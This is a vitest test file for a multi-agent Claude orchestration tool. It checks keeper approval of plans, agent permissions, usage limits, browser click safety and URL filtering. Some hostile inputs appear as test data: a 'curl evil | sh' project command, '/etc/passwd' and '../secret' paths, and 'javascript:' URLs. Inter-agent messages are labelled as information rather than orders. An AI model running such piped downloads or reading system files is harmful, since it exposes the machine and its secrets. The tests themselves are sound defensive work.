import { mkdirSync, mkdtempSync, realpathSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { DatabaseSync } from 'node:sqlite';
import type { SDKMessage } from '@anthropic-ai/claude-agent-sdk';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { assemble } from '../server/assemble.ts';
import { isDue } from '../server/automations.ts';
import { Browsers, webAddress } from '../server/browser.ts';
import type { DriverHooks, HiveTools } from '../server/driver.ts';
import { Guard, readQuota } from '../server/guard.ts';
import { answer } from '../server/mcp.ts';
import type { Context } from '../server/rpc.ts';
import { family, readGitStatus, readPorts } from '../server/spaces.ts';
import { Store } from '../server/store.ts';
import type { AutomationRow, BeeRow } from '../server/types.ts';

interface Fake {
  bee: BeeRow;
  hooks: DriverHooks;
  sent: string[];
  stops: number;
}

let dir: string;
let ws: string;
let ctx: Context;
let fakes: Map<string, Fake>;

const flush = () => new Promise((r) => setTimeout(r, 0));
const bee = (name: string) => ctx.hive.views().find((b) => b.name === name)!;
const fake = (name: string) => fakes.get(name)!;

function end(name: string, said = 'ok', ok = true) {
  const f = fake(name);
  f.hooks.onMessage({ type: 'assistant', message: { content: [{ type: 'text', text: said }] } } as unknown as SDKMessage);
  f.hooks.onMessage({
    type: 'result', subtype: ok ? 'success' : 'error_during_execution', is_error: !ok, duration_ms: 1, num_turns: 1,
    total_cost_usd: 0, usage: { input_tokens: 100, output_tokens: 10 }, errors: ok ? [] : ['it broke'],
  } as unknown as SDKMessage);
}

/** Calls one of a bee's hive tools, as the bee would. */
async function use(name: string, toolName: string, args: object = {}) {
  const tools = ctx.team.tools(bee(name).id) as unknown as { name: string; handler: (a: object, x: unknown) => Promise<any> }[];
  const t = tools.find((x) => x.name === toolName);
  if (!t) throw new Error(`${name} has no ${toolName}`);
  const out = await t.handler(args, {});
  return { text: out.content[0].text as string, bad: !!out.isError };
}

const names = (n: string) => (ctx.team.tools(bee(n).id) as unknown as HiveTools & { name: string }[]).map((t) => t.name);

beforeEach(() => {
  dir = realpathSync(mkdtempSync(join(tmpdir(), 'hive-')));
  ws = join(dir, 'ws');
  mkdirSync(ws);
  process.env.BEEKEEP_WORK = join(dir, 'work');
  fakes = new Map();
  ctx = assemble({
    file: join(dir, 'hive.db'),
    hiveCommand: '/bin/echo',
    quotaTool: null,
    alert: () => {},
    start: async (b, hooks) => {
      const f: Fake = { bee: b, hooks, sent: [], stops: 0 };
      fakes.set(b.name, f);
      return {
        send: (t) => void f.sent.push(t),
        interrupt: async () => void (f.stops += 1),
        close: () => {},
      };
    },
  });
  ctx.hive.createBee({ name: 'Queen', kind: 'queen', workspace: ws });
  ctx.hive.createBee({ name: 'Anna', mode: 'work', workspace: ws });
  ctx.hive.createBee({ name: 'Bob', mode: 'work', workspace: ws });
});

afterEach(() => {
  ctx.hive.shutdown();
  ctx.store.close();
});

const PAGE = [
  { key: 'text', title: 'Text', brief: 'write it', bee: 'Anna', files: ['content.txt'] },
  { key: 'page', title: 'Page', brief: 'build it', bee: 'Bob', after: ['text'], files: ['index.html'] },
];
const propose = (tasks: object[] = PAGE) => use('Queen', 'propose_plan', { goal: 'Landing page', tasks });
const plan = () => ctx.store.plans().at(-1)!;
const task = (key: string) => ctx.store.tasks(plan().id).find((t) => t.key === key)!;

describe('plans', () => {
  it('nothing starts before you say yes; then tasks run in order and the queen hears once', async () => {
    expect((await propose()).text).toMatch(/Waiting for the keeper/);
    await flush();
    expect(fakes.size).toBe(0);
    expect(ctx.store.notices()[0]).toMatchObject({ kind: 'needs', title: 'Queen has a plan' });

    ctx.team.approve(plan().id);
    await flush();
    expect([...fakes.keys()]).toEqual(['Anna']);
    expect(fake('Anna').sent[0]).toContain('Files you own for this task: content.txt');
    await use('Anna', 'finish_task', { report: 'Wrote 40 lines.' });
    end('Anna', 'bye');
    await flush();
    expect(task('text')).toMatchObject({ status: 'done', report: 'Wrote 40 lines.' });
    expect(fake('Bob').sent[0]).toContain('text: Wrote 40 lines.');
    end('Bob', 'Built index.html');
    await flush();
    expect(plan().status).toBe('done');
    expect(fake('Queen').sent).toHaveLength(1);
    expect(fake('Queen').sent[0]).toContain('page (Bob): done. Built index.html');
    expect(plan().used).toMatchObject({ orders: 2, wakeups: 1, tokens: 220 });
  });

  it('runs independent tasks side by side, but never two on the same file', async () => {
    await propose([
      { key: 'a', title: 'A', brief: 'x', bee: 'Anna', files: ['shared'] },
      { key: 'b', title: 'B', brief: 'x', bee: 'Bob', files: ['shared/part.txt'] },
      { key: 'c', title: 'C', brief: 'x', bee: 'Bob', files: ['other.txt'] },
    ]);
    ctx.team.approve(plan().id);
    await flush();
    expect(task('a').status).toBe('running');
    expect(task('b').status).toBe('waiting');
    expect(task('c').status).toBe('running');
    const blocked = fake('Bob').hooks.judge('Write', { file_path: join(ws, 'shared/part.txt') });
    expect(blocked.kind).toBe('ask');
    end('Anna');
    await flush();
    expect(task('b').status).toBe('running');
  });

  it('refuses plans that make no sense, with a reason the queen can act on', async () => {
    const bad = async (t: object[]) => (await propose(t)).text;
    const one = { key: 'a', title: 'A', brief: 'x', bee: 'Anna' };
    expect(await bad([])).toMatch(/at least one/);
    expect(await bad([{ ...one, bee: 'Zed' }])).toMatch(/no bee called "Zed"/);
    expect(await bad([{ ...one, bee: 'Queen' }])).toMatch(/is a queen/);
    expect(await bad([{ ...one, after: ['b'] }])).toMatch(/does not exist/);
    expect(await bad([{ ...one, after: ['b'] }, { ...one, key: 'b', after: ['a'] }])).toMatch(/circle/);
    expect(await bad([{ ...one, files: ['../secret'] }])).toMatch(/not inside/);
    expect(await bad([{ ...one, files: ['/etc/passwd'] }])).toMatch(/not inside/);
    expect(await bad([one, one])).toMatch(/Two tasks/);
    expect(ctx.store.plans()).toEqual([]);
  });

  it('says which bees need more permission, and only your yes gives it', async () => {
    ctx.hive.updateBee(bee('Anna').id, { mode: 'look' });
    expect((await propose()).text).toMatch(/let Anna edit files/);
    expect(ctx.team.needs(plan().id).map((n) => n.name)).toEqual(['Anna']);
    expect(bee('Anna').mode).toBe('look');
    ctx.team.approve(plan().id, true);
    expect(bee('Anna').mode).toBe('work');
  });

  it('a trusted queen starts by herself, but never past missing permission', async () => {
    ctx.hive.updateBee(bee('Queen').id, { autoPlan: true });
    ctx.hive.updateBee(bee('Anna').id, { mode: 'look' });
    await propose();
    expect(plan().status).toBe('proposed');
    ctx.team.refuse(plan().id);
    ctx.hive.updateBee(bee('Anna').id, { mode: 'work' });
    ctx.hive.order(bee('Queen').id, 'a goal');
    await flush();
    await propose();
    expect(plan().status).toBe('running');
  });

  it('a trusted queen starts one plan for each goal you give her, and none by herself', async () => {
    ctx.hive.updateBee(bee('Queen').id, { autoPlan: true });
    ctx.hive.order(bee('Queen').id, 'a goal', { source: 'auto' });
    await flush();
    await propose();
    expect(plan().status).toBe('proposed'); // A rule asked, not you.
    ctx.team.refuse(plan().id);
    end('Queen');
    await flush();
    end('Queen'); // She heard about the refusal.
    await flush();

    ctx.hive.order(bee('Queen').id, 'a goal');
    await flush();
    await propose();
    expect(plan().status).toBe('running');
    await flush();
    expect((await propose()).text).toMatch(/still running/);
    ctx.team.stopPlan(plan().id, 'enough');
    await propose();
    expect(plan().status).toBe('proposed'); // The same goal again needs your yes.
  });

  it('a cancelled order ends its task, for good', async () => {
    await propose();
    ctx.hive.order(bee('Anna').id, 'something else first');
    await flush();
    ctx.team.approve(plan().id);
    await flush();
    const waiting = ctx.store.openOrders().find((o) => o.taskId === task('text').id)!;
    expect(waiting.status).toBe('queued');
    ctx.hive.cancelOrder(waiting.id);
    expect(task('text').status).toBe('stopped');
    await flush();
    expect(plan().status).toBe('failed');
    ctx.team.recover();
    expect(task('text').status).toBe('stopped');
  });

  it('a removed bee’s tasks end, and its absence breaks nothing', async () => {
    await propose();
    ctx.team.approve(plan().id);
    await flush();
    ctx.hive.removeBee(bee('Bob').id);
    expect(task('page')).toMatchObject({ status: 'stopped', report: 'Its bee was removed.' });
    end('Anna');
    await flush();
    expect(plan().status).toBe('failed');
    expect(ctx.hive.views().find((b) => b.name === 'Anna')!.status).not.toBe('busy');
  });

  it('a plan ends with its queen', async () => {
    await propose();
    ctx.team.approve(plan().id);
    await flush();
    ctx.hive.removeBee(bee('Queen').id);
    expect(plan().status).toBe('stopped');
    expect(fake('Anna').stops).toBe(1);
  });

  it('a running task stops when the plan’s time is up', async () => {
    await propose();
    ctx.team.approve(plan().id);
    await flush();
    ctx.team.tick();
    expect(plan().status).toBe('running');
    ctx.team.tick(Date.now() + plan().limits.minutes * 60_000 + 1);
    expect(plan().status).toBe('stopped');
    expect(fake('Anna').stops).toBe(1);
  });

  it('your refusal reaches the queen with your words', async () => {
    await propose();
    ctx.team.refuse(plan().id, 'smaller please');
    await flush();
    expect(fake('Queen').sent[0]).toContain('smaller please');
    expect(task('text').status).toBe('stopped');
  });

  it('wakes the queen on a failure, and she can try again with a correction', async () => {
    await propose();
    ctx.team.approve(plan().id);
    await flush();
    end('Anna', 'hm', false);
    await flush();
    expect(task('text').status).toBe('failed');
    expect(fake('Queen').sent[0]).toMatch(/Task text \(Anna\) failed/);
    expect((await use('Queen', 'retry_task', { key: 'text', correction: 'use UTF-8' })).bad).toBe(false);
    await flush();
    expect(fake('Anna').sent[1]).toContain('use UTF-8');
    end('Queen');
    await flush();
    expect(plan().status).toBe('running');
  });

  it('ends a stuck plan when the queen does nothing about it', async () => {
    await propose();
    ctx.team.approve(plan().id);
    await flush();
    end('Anna', 'hm', false);
    await flush();
    end('Queen', 'I give up');
    await flush();
    expect(plan().status).toBe('failed');
  });

  it('the queen cannot restart what you stopped', async () => {
    await propose();
    ctx.team.approve(plan().id);
    await flush();
    ctx.team.stopTask(plan().id, 'text');
    expect(fake('Anna').stops).toBe(1);
    const again = await use('Queen', 'retry_task', { key: 'text', correction: 'x' });
    expect(again).toMatchObject({ bad: true });
    expect(again.text).toMatch(/keeper stopped|plan is/);
  });

  it('stops at its limit of orders', async () => {
    await propose();
    const p = plan();
    ctx.store.savePlan({ ...p, limits: { ...p.limits, orders: 1 } });
    ctx.team.approve(p.id);
    await flush();
    end('Anna');
    await flush();
    expect(plan().status).toBe('stopped');
    expect(ctx.store.notices()[0]!.body).toMatch(/limit of 1 orders/);
  });

  it('questions and retries cannot wake the queen forever', async () => {
    await propose();
    const p = plan();
    ctx.store.savePlan({ ...p, limits: { ...p.limits, wakeups: 2 } });
    ctx.team.approve(p.id);
    await flush();
    expect((await use('Anna', 'ask_queen', { question: 'A?' })).bad).toBe(false);
    expect((await use('Anna', 'ask_queen', { question: 'B?' })).bad).toBe(false);
    expect((await use('Anna', 'ask_queen', { question: 'C?' })).text).toMatch(/cannot be reached/);
  });

  it('a restart puts unfinished tasks back, and starts nothing by itself', async () => {
    await propose();
    ctx.team.approve(plan().id);
    await flush();
    ctx.hive.recover();
    ctx.team.recover();
    expect(task('text')).toMatchObject({ status: 'waiting', orderId: null });
  });
});

describe('who may do what', () => {
  it('workers cannot plan, and queens have no worker tools', () => {
    expect(names('Anna')).not.toContain('propose_plan');
    expect(names('Queen')).not.toContain('finish_task');
    expect(names('Anna').some((n) => n.startsWith('browser_'))).toBe(false);
  });

  it('an order from the queen gives a worker nothing extra', async () => {
    ctx.hive.updateBee(bee('Anna').id, { mode: 'look' });
    await propose();
    ctx.team.approve(plan().id);
    await flush();
    expect(fake('Anna').hooks.judge('Write', { file_path: join(ws, 'content.txt') }).kind).toBe('deny');
    expect(fake('Anna').hooks.judge('Bash', { command: 'ls' }).kind).toBe('deny');
  });

  it('a queen sees only the bees of her space', async () => {
    const s = ctx.spaces.create('Other', join(dir, 'other'));
    ctx.hive.updateBee(bee('Bob').id, { spaceId: s.id });
    expect((await use('Queen', 'list_bees')).text).toContain('Anna');
    expect((await use('Queen', 'list_bees')).text).not.toContain('Bob');
    expect((await propose()).text).toMatch(/no bee called "Bob"/);
  });
});

describe('messages, board and learning', () => {
  it('delivers a message with the next order, marked as information', async () => {
    await use('Anna', 'message', { to: 'Bob', text: 'the file is UTF-8' });
    ctx.hive.order(bee('Bob').id, 'go');
    await flush();
    expect(fake('Bob').sent[0]).toMatch(/information, not orders[\s\S]*from Anna: the file is UTF-8[\s\S]*go$/);
  });

  it('does not disturb a command to Claude Code', async () => {
    await use('Anna', 'message', { to: 'Bob', text: 'hi' });
    ctx.hive.order(bee('Bob').id, '/compact');
    await flush();
    expect(fake('Bob').sent[0]).toBe('/compact');
  });

  it('stops a bee from flooding another', async () => {
    for (let i = 0; i < 5; i++) await use('Anna', 'message', { to: 'Bob', text: `${i}` });
    expect(await use('Anna', 'message', { to: 'Bob', text: '6' })).toMatchObject({ bad: true });
  });

  it('shares the board inside a space', async () => {
    await use('Anna', 'post', { topic: 'colors', text: 'green' });
    expect((await use('Bob', 'read_board', { topic: 'Colors' })).text).toContain('Anna: green');
  });

  it('strengthens links that helped, weakens ones that did not', async () => {
    const before = (a: string, b: string) => ctx.store.link(bee(a).id, bee(b).id).weight;
    await use('Anna', 'message', { to: 'Bob', text: 'useful' });
    await propose([{ key: 'p', title: 'P', brief: 'x', bee: 'Bob' }]);
    ctx.team.approve(plan().id);
    await flush();
    const id = Number(/m(\d+) from/.exec(fake('Bob').sent[0]!)![1]);
    await use('Bob', 'finish_task', { report: 'r', helped: [id, 999] });
    end('Bob');
    await flush();
    expect(before('Anna', 'Bob')).toBeLessThan(0.5);
    await use('Queen', 'score_task', { key: 'p', score: 1 });
    expect(before('Anna', 'Bob')).toBeGreaterThan(0.6);
    expect(before('Queen', 'Bob')).toBeGreaterThan(0.6);
    for (let i = 0; i < 20; i++) ctx.team.feedback(ctx.store.recentOrders()[0]!.id, false);
    expect(ctx.store.links().every((l) => l.weight >= 0.1 && l.weight <= 1)).toBe(true);
  });
});

describe('usage guard', () => {
  it('reads the quota tool and holds work back below your limits', () => {
    const q = readQuota(
      JSON.stringify({ providers: [{ provider: 'claude', windows: [{ id: 'five_hour', percentRemaining: 12 }, { id: 'seven_day', percentRemaining: 50, resetsAt: 'x' }] }] }),
    );
    expect(q).toMatchObject({ fiveHour: 12, week: 50 });
    expect(readQuota('nonsense')).toBeNull();
    const g = new Guard(ctx.store, null);
    Object.assign((g as unknown as { state: object }).state, q);
    expect(g.why()).toMatch(/12% of the 5-hour/);
    g.override();
    expect(g.why()).toBeNull();
    g.set({ paused: true });
    expect(g.why()).toMatch(/paused/);
    expect(new Guard(ctx.store, null).get().paused).toBe(true);
  });

  it('waits when the plan itself refuses a step', () => {
    const g = new Guard(ctx.store, null);
    g.heard({ status: 'allowed' });
    expect(g.why()).toBeNull();
    g.heard({ status: 'rejected', resetsAt: Date.now() / 1000 + 600 });
    expect(g.why()).toMatch(/refused/);
  });

  it('pausing holds everything, and letting go continues', async () => {
    ctx.guard.set({ paused: true });
    ctx.hive.order(bee('Anna').id, 'go');
    await flush();
    expect(fakes.size).toBe(0);
    ctx.guard.set({ paused: false });
    await flush();
    expect(fakes.has('Anna')).toBe(true);
  });
});

describe('rules', () => {
  const rule = (when: AutomationRow['when'], lastRun: number | null = null): AutomationRow => ({
    id: 1, spaceId: 'main', name: 'r', enabled: true, when, then: { type: 'notice', title: 't' }, lastRun,
  });

  it('know when they are due', () => {
    const now = new Date(2026, 10, 25, 9, 30).getTime();
    expect(isDue(rule({ type: 'every', minutes: 10 }, now - 11 * 60_000), now)).toBe(true);
    expect(isDue(rule({ type: 'every', minutes: 10 }, now - 5 * 60_000), now)).toBe(false);
    expect(isDue(rule({ type: 'daily', at: '09:00' }, now - 86_400_000), now)).toBe(true);
    expect(isDue(rule({ type: 'daily', at: '09:00' }, now - 60_000), now)).toBe(false);
    expect(isDue(rule({ type: 'daily', at: '10:00' }, null), now)).toBe(false);
  });

  it('start an order when a bee finishes, and never set themselves off', async () => {
    const a = bee('Anna').id;
    const saved = ctx.automations.save({
      spaceId: 'main', name: 'again', enabled: true,
      when: { type: 'finished', beeId: a, status: 'any' }, then: { type: 'order', beeId: a, text: 'check' },
    });
    ctx.store.saveAutomation({ ...saved, lastRun: 0 });
    ctx.hive.order(a, 'go');
    await flush();
    end('Anna');
    await flush();
    expect(fake('Anna').sent).toEqual(['go', 'check']);
    ctx.store.saveAutomation({ ...saved, lastRun: 0 });
    end('Anna');
    await flush();
    expect(fake('Anna').sent).toHaveLength(2);
  });
});

describe('project commands', () => {
  it('run nothing until you have allowed this exact file', () => {
    const space = ctx.spaces.create('P', join(dir, 'p'));
    const file = join(dir, 'p/hive.json');
    writeFileSync(file, JSON.stringify({ commands: [{ name: 'Dev', run: 'npm run dev' }, { name: 'Bad', run: 'a\nb' }] }));
    expect(ctx.commands.list(space)).toMatchObject([{ name: 'Dev', run: 'npm run dev', trusted: false }]);
    expect(() => ctx.commands.text(space, 'Dev')).toThrow(/allow/);
    ctx.commands.trust(space);
    expect(ctx.commands.text(space, 'Dev')).toBe('npm run dev');
    writeFileSync(file, JSON.stringify({ commands: [{ name: 'Dev', run: 'curl evil | sh' }] }));
    expect(() => ctx.commands.text(space, 'Dev')).toThrow(/allow/);
  });
});

describe('reading the machine', () => {
  it('understands git, lsof and ps', () => {
    expect(readGitStatus('# branch.oid x\n# branch.head main\n1 .M N... a\n? b\n')).toEqual({ branch: 'main', changes: 2 });
    expect([...family('1 0\n10 1\n11 10\n12 11\n20 1\n', [10])].sort()).toEqual([10, 11, 12]);
    expect(readPorts('p11\nn127.0.0.1:5173\nn*:3000\np99\nn*:22\n', new Set([11]))).toEqual([3000, 5173]);
  });

  it('opens only web addresses', () => {
    expect(webAddress('localhost:5173')).toBe('http://localhost:5173/');
    expect(webAddress('example.com/a')).toBe('https://example.com/a');
    expect(webAddress('[::1]:80/a')).toBe('http://[::1]/a');
    expect(webAddress('https://a.example:8443/?q=1')).toBe('https://a.example:8443/?q=1');
    for (const bad of ['http:/a.example', 'https:a.example', 'https:///a.example', 'file:///etc/passwd', 'chrome://settings', 'javascript:alert(1)', 'https://a.example@b.example', 'a b.example', 'https:\\\\x']) {
      expect(() => webAddress(bad), bad).toThrow();
    }
  });
});

describe('a bee’s browser', () => {
  it('acts only on what it last saw, and only on the site where it saw it', async () => {
    const browsers = new Browsers();
    let address = 'https://shop.example/';
    const clicked: string[] = [];
    let items = ['one', 'two'];
    const cdp = {
      send: async (what: string) =>
        what === 'Page.getFrameTree' ? { frameTree: { frame: { id: 'f' } } } : { executionContextId: 1, result: { value: { title: 't', heads: [], text: '', items } } },
    };
    const page = {
      url: () => address,
      $: async (q: string) => ({ click: async () => void clicked.push(`${q} on ${address}`), type: async () => {}, press: async () => {} }),
    };
    const inside = browsers as unknown as { tabs: Map<string, unknown>; beePages: Map<string, string> };
    inside.tabs.set('t', { id: 't', spaceId: 'main', page, cdp });
    inside.beePages.set('b', 't');
    await browsers.beeLook('b');
    await browsers.beeClick('b', 2);
    expect(clicked).toEqual(['[data-hive-ref="2"] on https://shop.example/']);
    await expect(browsers.beeClick('b', 2)).rejects.toThrow(/Nothing has the number 2/); // It has looked again since.
    await browsers.beeLook('b');
    const [now] = [...Array(900).keys()].filter((n) => browsers.sees('b', n));
    expect(now).toBeGreaterThan(2);
    expect(browsers.sees('other', now!)).toBe(false);
    address = 'https://bank.example/';
    expect(browsers.sees('b', now!)).toBe(false);
    for (let n = 1; n < 900; n++) await expect(browsers.beeClick('b', n)).rejects.toThrow(/Nothing has/);
    expect(clicked).toHaveLength(1);
    // However many things a page claims to have, it cannot claim numbers of later looks.
    items = Array(9999).fill('x');
    await browsers.beeLook('b');
    expect([...Array(9999).keys()].filter((n) => browsers.sees('b', n))).toHaveLength(150);
    // A page that moves on while it is being read shows nothing usable.
    cdp.send = async () => {
      address = 'https://other.example/';
      return { frameTree: { frame: { id: 'f' } }, executionContextId: 1, result: { value: { title: 't', heads: [], text: '', items } } } as never;
    };
    await browsers.beeLook('b');
    expect([...Array(9999).keys()].some((n) => browsers.sees('b', n))).toBe(false);
  }, 15_000);
});

describe('MCP for other Claude sessions', () => {
  const call = async () => ({ fine: true });

  it('lists tools, none of which can approve or type', async () => {
    const r = (await answer({ id: 1, method: 'tools/list' }, call)) as any;
    const tools = r.result.tools.map((t: { name: string }) => t.name);
    expect(tools).toContain('send_order');
    for (const t of ['type', 'hook', 'new_terminal', 'guard']) expect(tools).not.toContain(t);
    expect(r.result.tools.find((t: { name: string }) => t.name === 'send_order').inputSchema.properties).toHaveProperty('bee');
  });

  it('answers calls, refuses others, and ignores notifications', async () => {
    const run = (name: string) => answer({ id: 2, method: 'tools/call', params: { name, arguments: {} } }, call) as Promise<any>;
    expect((await run('list_bees')).result.content[0].text).toContain('fine');
    expect((await run('type')).result.isError).toBe(true);
    expect(await answer({ method: 'notifications/initialized' }, call)).toBeNull();
    expect(((await answer({ id: 3, method: 'initialize', params: {} }, call)) as any).result.serverInfo.name).toBe('hive');
  });
});

describe('older data', () => {
  it('is brought forward with a copy kept, and nothing lost', () => {
    const file = join(dir, 'old.db');
    const db = new DatabaseSync(file);
    db.exec(`
      CREATE TABLE bees (id TEXT PRIMARY KEY, name TEXT NOT NULL, role TEXT NOT NULL, model TEXT NOT NULL, mode TEXT NOT NULL,
        workspace TEXT NOT NULL, session_id TEXT, mark INTEGER NOT NULL, created_at INTEGER NOT NULL, removed INTEGER NOT NULL DEFAULT 0);
      CREATE TABLE events (id INTEGER PRIMARY KEY AUTOINCREMENT, bee_id TEXT NOT NULL, ts INTEGER NOT NULL, kind TEXT NOT NULL, data TEXT NOT NULL);
      CREATE TABLE orders (id INTEGER PRIMARY KEY AUTOINCREMENT, bee_id TEXT NOT NULL, source TEXT NOT NULL, text TEXT NOT NULL,
        priority INTEGER NOT NULL, status TEXT NOT NULL, created_at INTEGER NOT NULL, started_at INTEGER, ended_at INTEGER);
      CREATE TABLE approvals (id INTEGER PRIMARY KEY AUTOINCREMENT, bee_id TEXT NOT NULL, tool TEXT NOT NULL, input TEXT NOT NULL,
        reason TEXT NOT NULL, status TEXT NOT NULL, created_at INTEGER NOT NULL, decided_at INTEGER);
      CREATE TABLE kv (key TEXT PRIMARY KEY, value TEXT NOT NULL);
      INSERT INTO bees VALUES ('q', 'Queen', '', 'opus', 'look', '/w', 's1', 0, 1, 0), ('w', 'Worker 1', '', 'haiku', 'look', '/w', NULL, 1, 2, 0);
      INSERT INTO events (bee_id, ts, kind, data) VALUES ('q', 1, 'say', '{"text":"hi"}');
      INSERT INTO orders (bee_id, source, text, priority, status, created_at) VALUES ('q', 'you', 'go', 1, 'done', 1);
      INSERT INTO kv VALUES ('layout', '{"grid":1}');
    `);
    db.close();
    const s = new Store(file);
    expect(s.bees()).toMatchObject([
      { name: 'Queen', kind: 'queen', model: 'opus', sessionId: 's1', spaceId: 'main', autoPlan: false, grants: [] },
      { name: 'Worker 1', kind: 'worker', mode: 'look' },
    ]);
    expect(s.events('q')[0]!.data.text).toBe('hi');
    expect(s.order(1)).toMatchObject({ text: 'go', taskId: null, planFirst: false });
    s.close();
    const copy = new DatabaseSync(`${file}.before-v3`, { readOnly: true });
    expect(copy.prepare('SELECT count(*) AS n FROM bees').get()).toMatchObject({ n: 2 });
    copy.close();
    const again = new Store(file);
    expect(again.bees()).toHaveLength(2);
    again.close();
  });
});
